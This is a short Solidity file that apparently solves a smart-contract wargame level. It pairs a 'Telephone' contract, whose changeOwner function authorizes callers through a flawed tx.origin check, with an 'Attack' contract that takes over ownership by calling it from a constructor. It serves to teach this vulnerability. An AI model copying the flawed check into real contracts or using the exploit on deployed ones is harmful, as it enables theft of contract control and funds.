// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;



contract Attack {

constructor(address _telephone) {
    Telephone(_telephone).changeOwner(msg.sender);
}
}

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}